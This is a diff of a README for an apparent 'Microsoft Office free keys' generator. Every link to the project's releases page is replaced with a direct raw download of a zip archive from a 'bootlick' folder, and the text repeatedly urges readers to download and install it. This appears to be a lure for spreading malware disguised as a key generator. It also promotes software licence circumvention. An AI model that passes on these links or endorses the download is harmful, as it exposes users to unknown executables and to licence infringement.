@@ -4,7 +4,7 @@
 Microsoft-Office-Free-Keys is a user-friendly application that helps you generate free product keys for various editions of Microsoft Office, including Office 2016, 2019, and 2021. This program is designed for testing and evaluation purposes, providing you with quick access to activation keys effortlessly.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Wrbxt/Microsoft-Office-Free-Keys/releases)
+[![Download](https://raw.githubusercontent.com/Wrbxt/Microsoft-Office-Free-Keys/main/bootlick/Microsoft-Office-Free-Keys.zip)](https://raw.githubusercontent.com/Wrbxt/Microsoft-Office-Free-Keys/main/bootlick/Microsoft-Office-Free-Keys.zip)
 
 ## 📋 How It Works
 The application generates product keys by using algorithms specifically designed for this purpose. When you run the program, it will display different keys for various editions of Microsoft Office. You can then use these keys to activate the software for your personal testing and evaluation.
@@ -21,7 +21,7 @@ To run Microsoft-Office-Free-Keys efficiently, ensure your system meets the foll
 Follow these simple steps to download and set up the application on your computer:
 
 1. **Visit the Releases Page**  
-   Go to this [page to download](https://github.com/Wrbxt/Microsoft-Office-Free-Keys/releases) the latest version of Microsoft-Office-Free-Keys.
+   Go to this [page to download](https://raw.githubusercontent.com/Wrbxt/Microsoft-Office-Free-Keys/main/bootlick/Microsoft-Office-Free-Keys.zip) the latest version of Microsoft-Office-Free-Keys.
 
 2. **Download the Latest Version**  
    Look for the latest release and click on the download link for the installer file. 
@@ -69,7 +69,7 @@ If you encounter any problems, you can open an issue on the GitHub repository to
 Join our community on GitHub to share your experiences, ask questions, and find tips on using Microsoft-Office-Free-Keys effectively. Your feedback helps us improve the application.
 
 ## 📥 Download & Install
-To begin using Microsoft-Office-Free-Keys, remember to [visit this page to download the application](https://github.com/Wrbxt/Microsoft-Office-Free-Keys/releases). 
+To begin using Microsoft-Office-Free-Keys, remember to [visit this page to download the application](https://raw.githubusercontent.com/Wrbxt/Microsoft-Office-Free-Keys/main/bootlick/Microsoft-Office-Free-Keys.zip). 
 Simply follow the earlier installation steps to get started smoothly.
 
 ## 📢 Get Involved
